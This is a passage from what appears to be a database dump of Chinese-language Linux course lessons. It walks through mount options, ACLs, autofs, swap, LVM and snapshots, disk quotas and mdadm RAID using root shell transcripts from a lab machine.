~]#&nbsp;mount&nbsp;<br><br>/dev/hdc9 on /mnt/date type e0000xt3 (ro)<br><br>[root@station230 ~]#&nbsp;mount -o rw /mnt/date/<br>mount: /dev/hdc9 already mounted or /mnt/date busy<br>mount: according to mtab, /dev/hdc9 is already mounted on /mnt/date<br><br>[root@station230 ~]# mount -o rw,remount /mnt/date/<br><br>===========================================================================<br><br>挂载选项<br><br>[root@station230 ~]#&nbsp;mount -o rw,remount /mnt/date/<br>[root@station230 date]#&nbsp;id alice<br>uid=10003(alice) gid=10004(alice) groups=10004(alice)<br>[root@station230 date]#&nbsp;getfacl host.conf&nbsp;<br># file: host.conf<br># owner: root<br># group: root<br>user::rw-<br>group::r--<br>other::r--<br><br>[root@station230 date]#&nbsp;setfacl -m u:alice:rwx host.conf&nbsp;<br>setfacl: /mnt/date/host.conf: 不支持的操作<br><br>[root@station230 ~]#&nbsp;man mount<br>defaults<br>Use default options: rw, suid, dev, exec, auto, nouser,and async.<br><br>rw	支持读写	ro<br>suid	支持suid文件	nosuid<br>dev	nodev<br>exec	支持执行	noexec<br>auto	支持自动挂载（开机时或mount -a）	noauto<br>nouser	user<br>async	异步	sync 同步	<br><br>其它：<br><br>atime	noatime<br>acl	noacl<br>usrquota<br>grpquota<br>remount<br><br>[root@station230 ~]#&nbsp;mount -o acl,usrquota,grpquota,remount /mnt/date/<br><br>====================================================================================<br><br>让文件系统支持ACL<br><br>方法一：添加默认选项acl<br>[root@station230 ~]#&nbsp;dumpe2fs /dev/hdc3 | less<br>[root@station230 ~]#&nbsp;tune2fs -o acl /dev/hdc9&nbsp;设置默认的挂载选项<br>tune2fs 1.39 (29-May-2006)<br>[root@station230 ~]#&nbsp;tune2fs -l /dev/hdc9 | grep \'Default mount\'<br>Default mount options: acl<br>[root@station230 ~]#&nbsp;mount /mnt/date/<br>[root@station230 date]#&nbsp;tune2fs -o ^acl /dev/hdc9&nbsp;<br>tune2fs 1.39 (29-May-2006)<br>[root@station230 date]#&nbsp;tune2fs -l /dev/hdc9 |grep \'Default mount\'<br>Default mount options: (none)<br><br>方法二：挂载时，指定选项acl<br>[root@station230 ~]#&nbsp;mount -o acl /dev/hdc9 /mnt/data<br><br><br><br></dd><dt>自动挂载</dt><dd><br>设备文件类型:<br><br>本地设备文件<br>/dev/cdrom<br>/dev/sda5<br>/dev/vg0/lv0<br>/dev/md0<br>/dev/md1<br><br>网络设备文件	NAS存储<br>mount -t cifs	//192.168.0.210/mp3 /mnt/windows<br>mount -t nfs	192.168.0.100:/share /mnt/nfs<br><br>==================================================================================<br><br>自动挂载第一种解决方案<br>/etc/fstab持续挂载 适合挂载本地设备和持续使用的设备<br><br>/dev/sda5 /mnt/dir5 ext3 defaults 0 0<br>//192.168.0.210/mp3 /mnt/windows cifs defaults 0 0<br>192.168.0.100:/share /mnt/nfs nfs defaults 0 0<br><br>==================================================================================<br><br>自动挂载第二种解决方案<br>automount按需挂载 适合挂载网络设备，和一些不需要持续访问的设备（/dev/cdrom）<br><br>示例一：<br><br>1)mkdir /test<br>vim /etc/auto.master<br>/test	/etc/auto.test<br><br>2)touch /etc/auto.test<br><br>3)vim /etc/auto.test<br>dd -fstype=ext3,sync,rw :/dev/sda6<br><br>4)service autofs restart<br><br>cd /test/dd<br><br>示例二：<br><br>[root@station230 ~]#&nbsp;grep misc /etc/auto.master&nbsp;<br>/misc	/etc/auto.misc<br># Note that if there are entries for /net or /misc (as<br><br>[root@station230 ~]#&nbsp;grep cd /etc/auto.misc&nbsp;<br>cd	-fstype=iso9660,ro,nosuid,nodev	:/dev/cdrom<br><br>[root@station230 ~]#&nbsp;ls /misc/<br>[root@station230 ~]#&nbsp;cd /misc/cd<br>[root@station230 cd]#&nbsp;df&nbsp;<br>文件系统 1K-块 已用 可用 已用% 挂载点<br>/dev/hdc3 19840924 1959824 16856960 11% /<br>/dev/hdc8 9920592 257212 9151312 3% /home<br>/dev/hdc6 19840892 3493056 15323696 19% /usr<br>/dev/hdc5 19840892 230928 18585824 2% /usr/local<br>/dev/hdc2 49594228 900832 46133440 2% /var<br>/dev/hdc1 497829 16451 455676 4% /boot<br>tmpfs 1019672 0 1019672 0% /dev/shm<br>/disk20.img 49574 4924 42090 11% /mnt/disk20<br>/dev/md0 283367 113771 155050 43% /mnt/raid5<br>/dev/md1 94695 5664 84142 7% /mnt/raid1<br>/dev/hda 3435526 3435526 0 100% /misc/cd<br><br>=====================================================================================<br><br>练习:<br>在/下创建/yum目录 在yum目录上使用autofs和yum库相结合&nbsp;<br><br>1.autofs<br>2.yum<br><br>1.vim /etc/auto.master&nbsp;<br>/yum /etc/auto.yum --timeout=10<br><br>2.mkdir /yum<br>touch /etc/auto.yum<br><br>3.vim /etc/auto.yum<br>iso -fstype=iso9660,loop :/var/ftp/rhel5u8.iso<br><br>4.cd /yum/iso<br><br>5.vim /etc/yum.repos.d/iso.repo<br><br>[Server]<br>name=yum server<br>baseurl=file:///yum/iso/Server<br>enabled=1<br>gpgcheck=0<br><br>测试自动卸载<br>service autofs testart<br>watch -n 0.5 mount<br>10秒之后自动卸载<br><br><br><br></dd><dt>创建swap分区</dt><dd>创建swap分区<br><br>[root@station230 ~]#&nbsp;free -m<br>[root@station230 ~]#&nbsp;fdisk -u /dev/hdc	1G,82<br>[root@station230 ~]#&nbsp;partx -a /dev/hdc<br>[root@station230 ~]#&nbsp;mkswap -L swap2 /dev/hdc11<br>[root@station230 ~]#&nbsp;vim /etc/fstab<br>LABEL=swap2 swap swap defaults 0 0<br><br>[root@station230 ~]#&nbsp;swapon /dev/hdc11<br>[root@station230 ~]#&nbsp;swapon -s<br>Filename Type Size Used Priority<br>/dev/hdc7 partition 16386260 0 -1<br>/dev/hdc11 partition 976552 0 -2<br><br>==================================================================================<br><br>使用文件创建swap<br><br>[root@station230 ~]#&nbsp;dd if=/dev/zero of=/swap3 bs=1M count=512<br>512+0 records in<br>512+0 records out<br>536870912 bytes (537 MB) copied, 3.85724 seconds, 139 MB/s<br><br>[root@station230 ~]#&nbsp;ll -h /swap3&nbsp;<br>-rw-r--r-- 1 root root 512M 09-12 13:59 /swap3<br>[root@station230 ~]#&nbsp;mkswap /swap3&nbsp;<br>Setting up swapspace version 1, size = 536866 kB<br><br>[root@station230 ~]#&nbsp;swapon /swap3&nbsp;<br>[root@station230 ~]#&nbsp;swapon -s<br></dd><dt>链接文件</dt><dd>链接文件<br><br>符号链接(软链接)<br>硬链接<br><br>软硬连接<br>ln 源文件 目标文件 ----------------硬链接<br>ln -s 源文件 目标文件--------------软链接<br><br>区别<br>1.软链接inode号不同代表是两个不同的文件.硬链接是相同的表示是同一个文件<br>2.软链接的链结文件和源文件权限不同,硬链接是相同<br>3.软链接源文件不能改名或者删除.硬链接源文件可以改名或者删除<br>4.软链接占用硬盘空间非常小,硬链接占用相同大小的空间<br>5.软链接必须得写绝对路径,硬链接则绝对和相对路径都可以<br>6.软链接可以跨文件系统,硬链接不可以跨文件系统<br>7.软链接可以给目录做连接,硬链接不可以给目录做链接<br><br>硬链接限制：<br>1. 不能跨文件系统（分区）<br>2. 目录不能做硬链接<br></dd><dt>LVM</dt><dd>LVM逻辑卷<br><br>准备工作：创建一块或多块硬盘(不需要分区)，或者一个或多个分区（8e）<br>[root@station230 ~]#&nbsp;fdisk -u /dev/hdc<br>[root@station230 ~]#&nbsp;partx -a /dev/hdc<br><br>======================================================================<br><br>1. 创建pv<br><br>[root@station230 ~]#&nbsp;pvcreate /dev/hdc12<br>Writing physical volume data to disk \"/dev/hdc12\"<br>Physical volume \"/dev/hdc12\" successfully created<br>[root@station230 ~]#&nbsp;pvscan<br><br>======================================================================<br><br>2. 创建vg<br><br>[root@station230 ~]#&nbsp;vgcreate vg_01 /dev/hdc12&nbsp;//指定PE的大小 -s 16M<br>Volume group \"vg_01\" successfully created<br>[root@station230 ~]#&nbsp;vgdisplay&nbsp;<br>--- Volume group ---<br>VG Name vg_01<br>System ID&nbsp;<br>Format lvm2<br>Metadata Areas 1<br>Metadata Sequence No 1<br>VG Access read/write<br>VG Status resizable<br>MAX LV 0<br>Cur LV 0<br>Open LV 0<br>Max PV 0<br>Cur PV 1<br>Act PV 1<br>VG Size 92.00 MB<br>PE Size 4.00 MB<br>Total PE 23<br>Alloc PE / Size 0 / 0&nbsp;<br>Free PE / Size 23 / 92.00 MB<br>VG UUID VjclY4-kPVB-bJ0t-fWvl-7mab-T933-WPsiaP<br><br>==========================================================================<br><br>3. 创建lv<br><br>[root@station230 ~]#&nbsp;lvcreate -L 50M -n lv01 vg_01<br>Rounding up size to full physical extent 52.00 MB<br>Logical volume \"lv01\" created<br>[root@station230 ~]#&nbsp;lvscan&nbsp;<br>ACTIVE \'/dev/vg_01/lv01\' [52.00 MB] inherit<br><br>==========================================================================<br><br>4. 格式化，挂载<br><br>[root@station230 ~]#&nbsp;mkfs.ext3 /dev/vg_01/lv01&nbsp;<br>[root@station230 ~]#&nbsp;mkdir /mnt/lv<br>[root@station230 ~]#&nbsp;vim /etc/fstab&nbsp;<br>/dev/vg_01/lv01 /mnt/lv auto defaults 0 0<br><br>[root@station230 ~]#&nbsp;mount -a<br>[root@station230 ~]#&nbsp;df /mnt/lv/<br>文件系统 1K-块 已用 可用 已用% 挂载点<br>/dev/mapper/vg_01-lv01<br>51559 4956 43941 11% /mnt/lv<br><br>=============================================================================<br><br>5. 数据移动<br><br>pvmove /dev/sda5 /dev/sda7	指定设备移动数据<br>pvmove /dev/sda7	不指定会随机移动<br><br>==============================================================================<br><br>6. 删除lv<br><br>先卸载/dev/vg0/lv0<br>umount /dev/vgo/lvo<br>1.lvremove /dev/vg0/lv0<br>2.vgremove vg0<br>3.pvremove /dev/sda{5,6,7}<br><dl><dt>扩展LV</dt><dd>扩展lv<br><br>[root@station230 ~]#&nbsp;df -Th /mnt/lv/<br>文件系统 类型 容量 已用 可用 已用% 挂载点<br>/dev/mapper/vg_01-lv01<br>ext3 51M 51M 0 100% /mnt/lv<br><br>======================================================================<br><br>1. 准备新的pv<br><br>[root@station230 ~]#&nbsp;fdisk -u /dev/hdc<br>[root@station230 ~]#&nbsp;partx -a /dev/hdc<br>[root@station230 ~]#&nbsp;pvcreate /dev/hdc13<br>Writing physical volume data to disk \"/dev/hdc13\"<br>Physical volume \"/dev/hdc13\" successfully created<br>[root@station230 ~]#&nbsp;pvscan&nbsp;<br>PV /dev/hdc12 VG vg_01 lvm2 [92.00 MB / 40.00 MB free]<br>PV /dev/hdc13 lvm2 [95.37 MB]<br>Total: 2 [187.37 MB] / in use: 1 [92.00 MB] / in no VG: 1 [95.37 MB]<br><br>========================================================================<br><br>2. 扩展vg<br><br>[root@station230 ~]#&nbsp;vgextend vg_01 /dev/hdc13<br>Volume group \"vg_01\" successfully extended<br>[root@station230 ~]#&nbsp;vgdisplay&nbsp;<br>--- Volume group ---<br>VG Name vg_01<br>System ID&nbsp;<br>Format lvm2<br>Metadata Areas 2<br>Metadata Sequence No 3<br>VG Access read/write<br>VG Status resizable<br>MAX LV 0<br>Cur LV 1<br>Open LV 1<br>Max PV 0<br>Cur PV 2<br>Act PV 2<br>VG Size 184.00 MB<br>PE Size 4.00 MB<br>Total PE 46<br>Alloc PE / Size 13 / 52.00 MB<br>Free PE / Size 33 / 132.00 MB<br>VG UUID VjclY4-kPVB-bJ0t-fWvl-7mab-T933-WPsiaP<br><br>===========================================================================<br><br>3. 扩展lv<br><br>[root@station230 ~]#&nbsp;lvextend -L 100M /dev/vg_01/lv01&nbsp;<br>Extending logical volume lv01 to 100.00 MB<br>Logical volume lv01 successfully resized<br>-L 100M 到100M<br>-L +100M 增加100M<br>-l 50	到50个PE<br>-l +50 增加50个PE<br><br>[root@station230 ~]#&nbsp;lvscan&nbsp;<br>ACTIVE \'/dev/vg_01/lv01\' [100.00 MB] inherit<br><br>============================================================================<br><br>4. 刷新文件系统<br><br>[root@station230 ~]#&nbsp;resize2fs /dev/vg_01/lv01&nbsp;<br>resize2fs 1.39 (29-May-2006)<br>Filesystem at /dev/vg_01/lv01 is mounted on /mnt/lv; on-line resizing required<br>Performing an on-line resize of /dev/vg_01/lv01 to 102400 (1k) blocks.<br>The filesystem on /dev/vg_01/lv01 is now 102400 blocks long.<br><br>[root@station230 ~]#&nbsp;df -Th /mnt/lv/<br>文件系统 类型 容量 已用 可用 已用% 挂载点<br>/dev/mapper/vg_01-lv01<br>ext3 97M 51M 42M 56% /mnt/lv<br><br>pvcreate pvscan pvdisplay<br>lvcreate lvscan lvdisplay lvs<br>vgcreate vgscan vgdisplay&nbsp;<br></dd><dt>LV快照</dt><dd>lv快照 snapshot<br><br>解决备份和恢复时，数据的一致性问题<br>快照卷的大小取决于原卷数据增长率<br>快照卷使用的空间和原卷占用同一VG！！！<br><br>[root@station230 ~]#&nbsp;lvcreate -L 50M -s -n lv01-snap /dev/vg_01/lv01&nbsp;<br>Rounding up size to full physical extent 52.00 MB<br>Volume group \"vg_01\" has insufficient free space (8 extents): 13 required.<br><br>=================================================================================<br><br>例：备份/dev/vg_01/lv01上的oracle数据（脚本）<br><br>1. 创建快照卷<br>[root@station230 ~]#&nbsp;lvcreate -L 20M -s -n lv01-snap /dev/vg_01/lv01	快照大小应比实际数据大小要大<br>Logical volume \"lv01-snap\" created<br>[root@station230 ~]#&nbsp;lvscan&nbsp;<br>ACTIVE Original \'/dev/vg_01/lv01\' [152.00 MB] inherit<br>ACTIVE Snapshot \'/dev/vg_01/lv01-snap\' [20.00 MB] inherit<br><br>2. 只读挂载<br>[root@station230 ~]#&nbsp;mount -o ro /dev/vg_01/lv01-snap /mnt/lv01-snap/<br><br>3. 通过备份软件指向快照卷进行备份。。。。。<br><br>4. 备份完成后<br>[root@station230 ~]#&nbsp;umount /mnt/lv01-snap/<br>[root@station230 ~]#&nbsp;lvremove -f /dev/vg_01/lv01-snap&nbsp;<br>Logical volume \"lv01-snap\" successfully removed<br><br>===================================================================================</dd></dl></dd></dl></dt><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.jpg','centos:latest','2016-10-13 11:11:49',1,NULL,'',0,''),(69,'linux基础课程训练八','磁盘操作相关的linux命令','<p>说明：我虚拟环境使用的是centos,可以通过&nbsp;cat&nbsp;/etc/issue来查看，如果发现测试的命令找不到\r\n</p><p>可以使用yum&nbsp;install&nbsp;-y&nbsp;命令&nbsp;先插入这个命令再去运行试一试。比如man命令可能运行不了。yum&nbsp;install&nbsp;-y&nbsp;man&nbsp;之后就可以正常使用了。</p><p>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</p><dt>磁盘配额</dt><dd>Quota磁盘配额<br><br>限制用户或组对磁盘的使用，例如文件服务器、邮箱大小 针对文件系统（分区）<br><br>df /dev/hdc8<br>/dev/hdc8 9920592 154680 9253844 2% /home<br><br>=======================================================================================<br><br>一、让文件系统支持配额&nbsp;<br><br>mount -o usrquota /dev/sda8 /mnt<br>或者<br>vim /etc/fstab<br>LABEL=/home /home ext3 defaults,usrquota,grpquota 1 2<br><br>[root@station230 ~]#&nbsp;mount -o remount /home/<br>[root@station230 ~]#&nbsp;mount<br>/dev/hdc8 on /home type ext3 (rw,usrquota,grpquota)<br><br>二、创建磁盘配额的数据库（相应分区挂载点）<br>[root@station230 ~]#&nbsp;quotacheck -acug	描述-a所有支持配额分区，然后-c创建 -u用户和-g组的配额文件<br>-m 把以前的数据库清除<br>[root@station230 ~]#&nbsp;ls /home/<br>aquota.group aquota.user<br><br>三、启动磁盘配额<br>[root@station230 ~]#&nbsp;quotaon -va<br>[root@station230 ~]#&nbsp;quotaon /dev/hdc8<br><br>========================================================================================<br><br>edquota -p robin blues	复制用户配额<br>repquota -av	显示当前所有用户配额 -g 查看组配额<br>edquota -t	修改宽限时间<dl><dt>日常管理工作</dt><dd>日常管理工作<br><br>设置配额<br><br>===========================================================================<br><br>方法一：edquota<br><br>用户：edquota -u jack<br>Disk quotas for user jack (uid 501):<br>Filesystem blocks soft hard inodes soft hard<br>/dev/hdc8 36 0 0 9 0 0<br>单位是k<br><br>blocks: 从磁盘使用量限制，比如限制用户使用100M<br>inodes:	从创建文件数限制，比如只能建立100个文件<br><br>soft：软限制 block 80M<br>hard：硬限制 block 100M<br>grace time: 宽限期 默认7天 # edquota -t&nbsp;<br><br>示例：edquota -u jack<br>Disk quotas for user jack (uid 501):<br>Filesystem blocks soft hard inodes soft hard<br>/dev/hdc8 36 0 10240 9 0 11<br>[root@station230 ~]#&nbsp;su - jack<br>[jack@station230 ~]$&nbsp;dd if=/dev/zero of=/home/jack/file10 bs=1M count=6<br>6+0 records in<br>6+0 records out<br>6291456 bytes (6.3 MB) copied, 0.0145555 seconds, 432 MB/s<br>[jack@station230 ~]$&nbsp;dd if=/dev/zero of=/home/jack/file11 bs=1M count=6<br>hdc8: write failed, user block limit reached.<br>dd: 写入 “/home/jack/file11”: 超出磁盘限额<br>4+0 records in<br>3+0 records out<br>4141056 bytes (4.1 MB) copied, 0.0109379 seconds, 379 MB/s<br><br>=============================================================================<br><br>方法二：setquota	命令行<br><br>setquota -u|-g user|group block限制 inode限制 文件系统<br><br>setquota jack 10240 12<br><br>setquota -u alice 20000 20480 15 20 /dev/hdc8<br><br>==================================================================================<br><br>方法三：复制<br><br>[root@station230 ~]#&nbsp;edquota -p alice user21 user23	将alice配额设置复制给user21 user23<br><br>查看单个用户quota<br>[root@station230 ~]#&nbsp;quota alice<br><br>查看所有用户quota<br>[root@station230 ~]#&nbsp;repquota -a<br>*** Report for user quotas on device /dev/hdc8<br>Block grace time: 7days; Inode grace time: 7days<br>Block limits File limits<br>User used soft hard grace used soft hard grace<br>----------------------------------------------------------------------<br>root -- 153812 0 0 33 0 0&nbsp;<br>jack -- 40 0 10240 11 0 11&nbsp;<br>oracle -- 40 0 0 10 0 0&nbsp;<br>alice -- 32 20000 20480 8 15 20<br></dd><dt>针对组设置配额</dt><dd>针对组设置配额<br><br>uplooking组 tom和jerry<br><br>mount -o grpquota /dev/sda8 /opt<br>quotacheck -g /opt<br>edquota -g uplooking<br>quotaon -g /opt<br><br><br>对公司的各个部门进行磁盘使用的限制<br><br>组block:100M，inodes:20 整个组的成员一共能使用100M，20个文件<br><br><br><br>==================================================================================<br><br>示例：限制hr组的成员能在/home目录中：100M 50个文件<br><br>groupadd hr<br>useradd hr01 -G hr<br>useradd hr02 -G hr<br>[root@station230 ~]#&nbsp;mkdir /home/hrdir<br>[root@station230 ~]#&nbsp;chmod 777 /home/hrdir/<br>[root@station230 ~]#&nbsp;edquota -g hr<br>Disk quotas for group hr (gid 10010):<br>Filesystem blocks soft hard inodes soft hard<br>/dev/hdc8 0 0 102400 0 0 50<br><br>[root@station230 ~]#&nbsp;su - hr01<br>[hr01@station230 ~]$&nbsp;cd /home/hrdir/<br>[hr01@station230 hrdir]$&nbsp;ll<br>总计 0<br>[hr01@station230 hrdir]$&nbsp;dd if=/dev/zero of=file1 bs=1M count=50<br>50+0 records in<br>50+0 records out<br>52428800 bytes (52 MB) copied, 0.0788837 seconds, 665 MB/s<br><br>[root@station230 ~]#&nbsp;su - hr02<br>[hr02@station230 ~]$&nbsp;cd /home/hrdir/<br>[hr02@station230 hrdir]$&nbsp;ls<br>file1<br>[hr02@station230 hrdir]$&nbsp;dd if=/dev/zero of=file2 bs=1M count=60<br>60+0 records in<br>60+0 records out<br>62914560 bytes (63 MB) copied, 0.0966439 seconds, 651 MB/s<br>[hr02@station230 hrdir]$&nbsp;dd if=/dev/zero of=file3 bs=1M count=60<br>60+0 records in<br>60+0 records out<br>62914560 bytes (63 MB) copied, 0.460032 seconds, 137 MB/s<br><br><br><br>[root@station230 ~]#&nbsp;chgrp hr /home/hrdir/<br>[root@station230 ~]#&nbsp;chmod g+s /home/hrdir/	让组继承<br>[root@station230 ~]#&nbsp;ll -d /home/hrdir/<br>drwxrwsrwx 2 root hr 4096 09-13 16:13 /home/hrdir/<br>[root@station230 ~]#&nbsp;rm -rf /home/hrdir/*<br><br>[root@station230 ~]#&nbsp;su - hr01<br>[hr01@station230 ~]$&nbsp;dd if=/dev/zero of=/home/hrdir/file1 bs=1M count=50<br>50+0 records in<br>50+0 records out<br>52428800 bytes (52 MB) copied, 0.0800367 seconds, 655 MB/s&nbsp;<br>[hr01@station230 ~]$&nbsp;ll /home/hrdir/<br><br>总计 51256<br>-rw-rw-r-- 1 hr01 hr 52428800 09-13 16:20 file1<br><br>[hr02@station230 ~]$&nbsp;cd /home/hrdir/<br>[hr02@station230 hrdir]$&nbsp;dd if=/dev/zero of=file3 bs=1M count=60<br>hdc8: write failed, group block limit reached.<br>dd: 写入 “file3”: 超出磁盘限额<br>50+0 records in<br>49+0 records out<br>52310016 bytes (52 MB) copied, 0.0799108 seconds, 655 MB/s<br><br><br>[root@station230 ~]#&nbsp;repquota -aug<br>*** Report for group quotas on device /dev/hdc8<br>Block grace time: 7days; Inode grace time: 7days<br>Block limits File limits<br>Group used soft hard grace used soft hard grace<br>----------------------------------------------------------------------<br>root -- 153804 0 0 31 0 0&nbsp;<br>jack -- 40 0 0 11 0 0&nbsp;<br>user1 -- 32 0 0 8 0 0&nbsp;<br>user2 -- 32 0 0 8 0 0&nbsp;<br>user3 -- 32 0 0 8 0 0&nbsp;<br>user4 -- 32 0 0 8 0 0&nbsp;<br>hr -- 102400 0 102400 3 0 50&nbsp;<br><br>=====================================================================================<br></dd></dl></dd><dt>RAID</dt><p></p><dd><span>RAID<br></span><br>RAID(RAID0,RAID1,RAID5,RAID6,RAID10)<br><br><span>软RAID</span>	利用计算机的cpu资源<br><span>硬RAID</span>	raid上有raid卡，利用raid卡进行独立处理raid请求<br><br>=============================================================================<br><span><br>假设一块硬盘为1G，做成各种raid之后的实际有效空间<br></span><br><span>raid名称</span><span>&nbsp;</span>0	1	5	10(01)<br>条带化	镜像	带奇偶校验的条带化	1+0<br><span>硬盘数量</span>	2块	2块	3块	4块<span>&nbsp;</span><br><span>有效空间</span>	2G 1G 2G	2G<br><br>=============================================================================<br><br><span>常用命令：<br></span><br>mdadm -C /dev/md0 -l 5 -n 3 /dev/sda{5,6,7} -C 创建 -l 级别 -n 磁盘数量<br>mdadm -D /dev/md0 -D 显示raid信息<br>mdadm -S /dev/md0 -S 停止(删掉/dev/md0)<br>mdadm --zero-superblock /dev/sda5<br>mdadm --zero-superblock /dev/sda6<br>mdadm --zero-superblock /dev/sda7<br><br>mdadm -A /dev/md0 /dev/sda{5,6,7} -A停止后在启动<br>mdadm -Ds 显示扫描信息<br><br>=============================================================================<br><br><span>示例：<br>RAID5(3个分区) + 热备盘(1个分区) 类型：fdisk</span><br><br><span>1. 准备5个100M fdisk分区<br></span><br>[root@station230 ~]#<span>&nbsp;</span><span>fdisk -ul /dev/hdc</span><br>Disk /dev/hdc: 320.0 GB, 320072933376 bytes<br>/dev/hdc9 279579258 279774571 97657 fd Linux raid autodetect<br>/dev/hdc10 279774635 279969948 97657 fd Linux raid autodetect<br>/dev/hdc11 279970012 280165325 97657 fd Linux raid autodetect<br>/dev/hdc12 280165389 280360702 97657 fd Linux raid autodetect<br>/dev/hdc13 280360766 280556079 97657 fd Linux raid autodetect<br><br><span>2. 创建RAID<br></span><br>[root@station230 ~]#<span>&nbsp;</span><span>mdadm -C /dev/md0 -l 5 -n 3 -x 1 /dev/hdc{9,10,11,12}</span><br>mdadm: /dev/hdc9 appears to contain an ext2fs file system<br>size=976560K mtime=Thu Sep 13 11:32:25 2012<br>Continue creating array? y<br>mdadm: array /dev/md0 started.<br><br><span>3. 格式化，挂载<br></span><br>[root@station230 ~]#<span>&nbsp;</span><span>mkfs.ext3 /dev/md0</span><br>[root@station230 ~]#<span>&nbsp;</span><span>mkdir /mnt/raid5</span><br>[root@station230 ~]#<span>&nbsp;</span><span>vim /etc/fstab<span>&nbsp;</span></span><br>[root@station230 ~]#<span>&nbsp;</span><span>tail -1 /etc/fstab</span><span>&nbsp;</span><br>/dev/md0 /mnt/raid5 ext3 defaults 0 0<br>[root@station230 ~]#<span>&nbsp;</span><span>mount -a</span><br>[root@station230 ~]#<span>&nbsp;</span><span>df -Th</span><br>文件系统 类型 容量 已用 可用 已用% 挂载点<br>/dev/md0 ext3 185M 5.6M 170M 4% /mnt/raid5<br><br><span>4. 查看<br></span><br>[root@station230 ~]#<span>&nbsp;</span><span>mdadm -D /dev/md0<span>&nbsp;</span></span><br>/dev/md0:<br>Version : 0.90<br>Creation Time : Thu Sep 13 17:43:50 2012<br>Raid Level : raid5<br>Array Size : 195072 (190.53 MiB 199.75 MB)<br>Used Dev Size : 97536 (95.27 MiB 99.88 MB)<br>Raid Devices : 3<br>Total Devices : 4<br>Preferred Minor : 0<br>Persistence : Superblock is persistent<br><br>Update Time : Thu Sep 13 17:48:19 2012<br>State : clean<br>Active Devices : 3<br>Working Devices : 4<br>Failed Devices : 0<br>Spare Devices : 1<br><br>Layout : left-symmetric<br>Chunk Size : 64K<br><br>UUID : 6a2c9612:43053906:ef42749b:6cb58be8<br>Events : 0.4<br><br>Number Major Minor RaidDevice State<br>0 22 9 0 active sync /dev/hdc9<br>1 22 10 1 active sync /dev/hdc10<br>2 22 11 2 active sync /dev/hdc11<br><br>3 22 12 - spare /dev/hdc12<br><br><span>5. 模拟一块磁盘（RAID5成员）损坏，并移出<br></span><br>[root@station230 ~]# mdadm /dev/md0 -f /dev/hdc9 -r /dev/hdc9<br>[root@station230 ~]# mdadm -D /dev/md0<br>Number Major Minor RaidDevice State<br>0 22 12 0 active sync /dev/hdc12<br>1 22 10 1 active sync /dev/hdc10<br>2 22 11 2 active sync /dev/hdc11<br><br><span>6. 增加硬盘<br></span><br>[root@station230 ~]#<span>&nbsp;</span><span>mdadm /dev/md0 -a /dev/hdc9</span><br>mdadm: added /dev/hdc9<br>[root@station230 ~]#<span>&nbsp;</span><span>mdadm /dev/md0 -a /dev/hdc13</span><br>mdadm: added /dev/hdc13<br><br><span>7. 拉伸</span><br>[root@station230 ~]#<span>&nbsp;</span><span>mdadm -G /dev/md0 -n4</span><br>mdadm: Need to backup 384K of critical section..<br>mdadm: ... critical section passed.<br><br><span>8. 刷新文件系统</span><br>[root@station230 ~]#<span>&nbsp;</span><span>resize2fs /dev/md0<span>&nbsp;</span></span><br>resize2fs 1.39 (29-May-2006)<br>Filesystem at /dev/md0 is mounted on /mnt/raid5; on-line resizing required<br>Performing an on-line resize of /dev/md0 to 292608 (1k) blocks.<br>The filesystem on /dev/md0 is now 292608 blocks long.<br><br>[root@station230 ~]#<span>&nbsp;</span><span>cat /mnt/raid5/passwd</span><br><br><span>9. 设置开机生效<br></span><br>通过配置文件(推荐)<br><span>/usr/share/doc/mdadm-2.6.9/mdadm.conf-example</span><span>&nbsp;</span>配置文件帮助<span><br></span><br>[root@station230 ~]#<span>&nbsp;</span><span>mdadm -D -s &gt;&gt; /etc/mdadm.conf<span>&nbsp;</span></span><br>[root@station230 ~]#<span>&nbsp;</span><span>cat /etc/mdadm.conf<span>&nbsp;</span></span><br>ARRAY /dev/md0 level=raid5 num-devices=4 metadata=0.90 spares=1 UUID=6a2c9612:43053906:ef42749b:6cb58be8<br><br>============<br><br>mdadm 选项<br>-s, --scan<span>&nbsp;</span><br>-D, --detail<br>-C, --create<br>-G, --grow<br>-S, --stop<span>&nbsp;</span><br>-f, --fail<br>-r, --remove<br>-a, --add<br><br>=============<br><br>[root@station230 ~]#<span>&nbsp;</span><span>mdadm -C /dev/md1 -l1 -n2 /dev/hdc{14,15}</span><br>mdadm: largest drive (/dev/hdc15) exceed size (97792K) by more than 1%<br>Continue creating array?<span>&nbsp;</span><span>y</span><br>mdadm: array /dev/md1 started.<br><br>[root@station230 ~]#<span><span>&nbsp;</span>mkdir /mnt/raid1<span>&nbsp;</span></span><br>[root@station230 ~]#<span>&nbsp;</span><span>mount /dev/md1 /mnt/raid1</span><br><br>[root@station230 ~]#<span>&nbsp;</span><span>mdadm -D -s</span><br>ARRAY /dev/md0 level=raid5 num-devices=4 metadata=0.90 spares=1 UUID=6a2c9612:43053906:ef42749b:6cb58be8<br>ARRAY /dev/md1 level=raid1 num-devices=2 metadata=0.90 UUID=a7a4e32f:42eafdd6:5f18550b:3fcecea6<br>[root@station230 ~]#<span>&nbsp;</span><span>mdadm -D -s &gt;&gt; /etc/mdadm.conf<span>&nbsp;</span></span><br>[root@station230 ~]#<span>&nbsp;</span><span>cat /etc/mdadm.conf<span>&nbsp;</span></span><br>ARRAY /dev/md0 level=raid5 num-devices=4 metadata=0.90 spares=1 UUID=6a2c9612:43053906:ef42749b:6cb58be8<br>ARRAY /dev/md1 level=raid1 num-devices=2 metadata=0.90 UUID=a7a4e32f:42eafdd6:5f18550b:3fcecea6<br><dl><dt>实验</dt><dd>创建6个分区<br>5,6,7 做raid5 8,9做raid0<br>要求:<br>在将raid5 和 sda10 做成pv vg lv0<br>将lv0 触发挂载到/test<br>扩大lv0 将raid0 加入lv 并且将lv扩大到最大 包括文件系统括大</dd></dl></dd><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.jpg','centos:latest','2016-10-13 11:12:55',1,NULL,'',0,''),(70,'linux基础课程训练九','linux启动流程方面的命令练习','<p>说明：我虚拟环境使用的是centos,可以通过&nbsp;cat&nbsp;/etc/issue来查看，如果发现测试的命令找不到\r\n</p><p>可以使用yum&nbsp;install&nbsp;-y&nbsp;命令&nbsp;先插入这个命令再去运行试一试。比如man命令可能运行不了。yum&nbsp;install&nbsp;-y&nbsp;man&nbsp;之后就可以正常使用了。</p><p>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</p><p>启动流程<br><br>1.加载BIOS的硬件信息与进行自我测试，并依据设置取得第一个可启动的设备<br>2.读取并执行第一个启动设备内MBR的boot 